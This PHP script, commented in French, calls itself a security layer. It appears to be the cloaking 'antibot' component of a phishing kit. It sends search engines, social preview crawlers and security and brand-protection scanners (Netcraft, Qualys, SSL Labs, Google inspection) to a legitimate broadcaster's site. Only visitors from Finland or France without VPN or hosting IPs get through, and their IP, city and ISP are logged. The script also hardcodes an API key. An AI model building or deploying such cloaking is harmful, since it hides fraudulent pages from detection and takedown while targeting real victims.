<?php
/**
 * SYSTÈME DE SÉCURITÉ
 * Détection bot intelligente + Protection multi-couches
 */

// Configuration
define('ALLOWED_COUNTRIES', ['FI', 'FR']);
define('BOT_REDIRECT', 'https://www.snrt.ma/fr');
define('CAPTCHA_TIMEOUT', 300); // 5 minutes
define('MAX_ATTEMPTS', 5);

// Dossier logs
if (!is_dir(HOME . '/logs')) {
    @mkdir(HOME . '/logs', 0755, true);
}

/**
 * Obtenir IP réelle
 */
function getIP() {
    $ip = $_SERVER['REMOTE_ADDR'];

    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim($ips[0]);
    } elseif (!empty($_SERVER['HTTP_X_REAL_IP'])) {
        $ip = $_SERVER['HTTP_X_REAL_IP'];
    }

    return filter_var($ip, FILTER_VALIDATE_IP) ? $ip : $_SERVER['REMOTE_ADDR'];
}

/**
 * Vérifier si localhost
 */
function isLocal($ip) {
    $local = ['127.0.0.1', '::1', 'localhost'];
    if (in_array($ip, $local)) return true;

    // IPs privées
    if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
        return true;
    }

    return false;
}

/**
 * Logger sécurisé
 */
function logSec($file, $msg) {
    $path = HOME . '/logs/' . $file;
    $entry = '[' . date('Y-m-d H:i:s') . '] ' . $msg . "\n";
    @file_put_contents($path, $entry, FILE_APPEND | LOCK_EX);
}

/**
 * Rediriger les bots
 */
function redirectBot($reason) {
    logSec('bots.log', 'IP: ' . getIP() . ' | Reason: ' . $reason);
    header('Location: ' . BOT_REDIRECT, true, 302);
    exit();
}

/**
 * Détection bot INTELLIGENTE (moins agressive)
 */
function detectBot() {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $score = 0;
    $reasons = [];

    // 1. UA vide = bot certain
    if (empty($ua)) {
        return ['bot' => true, 'score' => 100, 'reasons' => ['Empty UA']];
    }

    // 2. Patterns bot — liste nettoyée :
    //    - Doublons supprimés (casse insensible via stripos)
    //    - 'android', 'java', 'none', 'search', 'fetch', 'find', 'motor', 'legs' retirés (faux positifs)
    //    - Regroupés par catégorie pour faciliter la maintenance
    $botPatterns = [

        // --- Outils de scraping / téléchargement ---
        'curl', 'wget', 'python', 'perl', 'ruby', 'go-http',
        'libwww', 'libwww-perl', 'lwp-', 'aiohttp', 'httpx',
        'mechanize', 'scrapy', 'axios',

        // --- Navigateurs headless / automation ---
        'headless', 'selenium', 'puppeteer', 'playwright', 'phantom',
        'htmlunit', 'watir', 'capybara', 'cypress',

        // --- Moteurs de recherche ---
        'googlebot', 'google-inspectiontool', 'apis-google', 'mediapartners-google',
        'adsbot-google', 'bingbot', 'bingpreview', 'msnbot',
        'baiduspider', 'yandexbot', 'yandexmobilebot', 'duckduckbot',
        'slurp',            // Yahoo
        'teoma',            // Ask
        'naverbot', 'yeti', // Naver
        'seznambot',        // Seznam
        'sogou',            // Sogou
        'exabot',           // Exalead

        // --- SEO / audit ---
        'ahrefsbot', 'semrushbot', 'mj12bot', 'dotbot', 'majestic',
        'rogerbot', 'seokicks', 'seoscanbot', 'linkdexbot',
        'blexbot', 'opensiteexplorer', 'siteauditbot',

        // --- Réseaux sociaux (crawlers de preview) ---
        'facebookexternalhit', 'facebot',
        'twitterbot', 'linkedinbot', 'pinterestbot',
        'whatsapp', 'telegrambot', 'slackbot', 'discordbot',
        'vkshare', 'xing-contenttabreceiver',

        // --- Monitoring / sécurité ---
        'pingdom', 'uptimerobot', 'statuscake', 'newrelic',
        'netcraftsurveyagent', 'asafaweb', 'qualys', 'ssl-labs',
        'shodan', 'masscan', 'zgrab', 'nmap',

        // --- Archivage ---
        'ia_archiver', 'archive.org_bot', 'httrack', 'webzip',
        'webcopier', 'sitesuck', 'teleport', 'offline-explorer',

        // --- Bots publicitaires / analytics ---
        'adbeat', 'admantx', 'adsbot', 'adscanner',
        'brandprotect', 'moatbot', 'dataprovider',

        // --- Crawlers génériques / inconnus ---
        'spider', 'crawl', 'crawler',
        'scraper', 'harvester', 'fetcher',
        'nutch', 'larbin', 'ezooms',
        'ccbot', 'barkrowler', 'careerbot',
        'openindexspider', 'seznambot', 'backlinkcrawler',
        '80legs', 'aboundex', 'acoonbot',
        'bnf.fr_bot', 'citeseerxbot', 'changedetection',
        'checkbot', 'linkwalker', 'linkaider',
        'easouspider', 'ecollector', 'gigabot',
        'istellabot', 'meanpathbot', 'memobot',
        'nerdybot', 'prlog', 'riddler',
        'scoutjet', 'sistrix', 'speedy',
        'surveybot', 'twengabot', 'woriobot',
        'xovibot', 'zumbot',

        // --- Identifiants techniques suspects ---
        '007ac9', '192.comAgent',
    ];

    foreach ($botPatterns as $pattern) {
        if (stripos($ua, $pattern) !== false) {
            return ['bot' => true, 'score' => 100, 'reasons' => ["Bot pattern: $pattern"]];
        }
    }

    // 3. UA trop court
    if (strlen($ua) < 20) {
        $score += 50;
        $reasons[] = 'UA too short';
    }

    // 4. Headers manquants (seulement si plusieurs manquent)
    $missing = 0;
    $headers = ['HTTP_ACCEPT', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_ACCEPT_ENCODING'];
    foreach ($headers as $h) {
        if (empty($_SERVER[$h])) $missing++;
    }
    if ($missing >= 2) {
        $score += 30;
        $reasons[] = "$missing headers missing";
    }

    // 5. Navigation TRÈS rapide (< 0.03s = bot certain)
    if (isset($_SESSION['last_time'])) {
        $diff = microtime(true) - $_SESSION['last_time'];
        if ($diff < 0.03) {
            $score += 60;
            $reasons[] = "Too fast: {$diff}s";
        }
    }
    $_SESSION['last_time'] = microtime(true);

    // Décision
    $isBot = ($score >= 80);

    if ($score > 0) {
        logSec('detection.log', 'IP: ' . getIP() . " | Score: $score | Bot: " . ($isBot ? 'YES' : 'NO') . ' | ' . implode(', ', $reasons));
    }

    return ['bot' => $isBot, 'score' => $score, 'reasons' => $reasons];
}

/**
 * Vérifier IP (géo + VPN)
 */
function checkIP($ip) {
    // Bypass localhost
    if (isLocal($ip)) {
        $_SESSION['ip_ok'] = true;
        return true;
    }

    // Vérifier cache session
    if (isset($_SESSION['ip_ok']) && $_SESSION['ip_ok'] === true) {
        return true;
    }

    // API IP
    $url = "https://pro.ip-api.com/json/$ip?key=NCx0PDVOcBsh1pQ&fields=21164031";
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 5,
        CURLOPT_SSL_VERIFYPEER => true,
    ]);

    $res  = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($code !== 200) {
        logSec('api_errors.log', "IP: $ip | HTTP: $code");
        return false;
    }

    $data = json_decode($res, true);

    if (!$data || $data['status'] !== 'success') {
        return false;
    }

    // Stocker infos
    $_SESSION['ip_data'] = [
        'ip'      => $ip,
        'country' => $data['countryCode'] ?? 'XX',
        'city'    => $data['city']        ?? 'Unknown',
        'isp'     => $data['isp']         ?? 'Unknown',
    ];

    // Vérifier pays
    if (!in_array($data['countryCode'], ALLOWED_COUNTRIES)) {
        logSec('blocked.log', "IP: $ip | Country: {$data['countryCode']}");
        return false;
    }

    // Vérifier VPN/Proxy
    if (($data['proxy'] ?? false) === true) {
        logSec('blocked.log', "IP: $ip | Proxy detected");
        return false;
    }

    // Vérifier Hosting
    if (($data['hosting'] ?? false) === true) {
        logSec('blocked.log', "IP: $ip | Hosting detected");
        return false;
    }

    // OK
    $_SESSION['ip_ok'] = true;
    logSec('access.log', "IP: $ip | Country: {$data['countryCode']} | City: {$data['city']}");

    return true;
}

// ==========================================
// EXÉCUTION AUTOMATIQUE
// ==========================================

$ip = getIP();

// Bypass localhost
if (!isLocal($ip)) {
    // Détection bot
    $bot = detectBot();
    if ($bot['bot']) {
        redirectBot(implode(', ', $bot['reasons']));
    }

    // Vérifier IP
    if (!checkIP($ip)) {
        redirectBot('IP check failed');
    }
}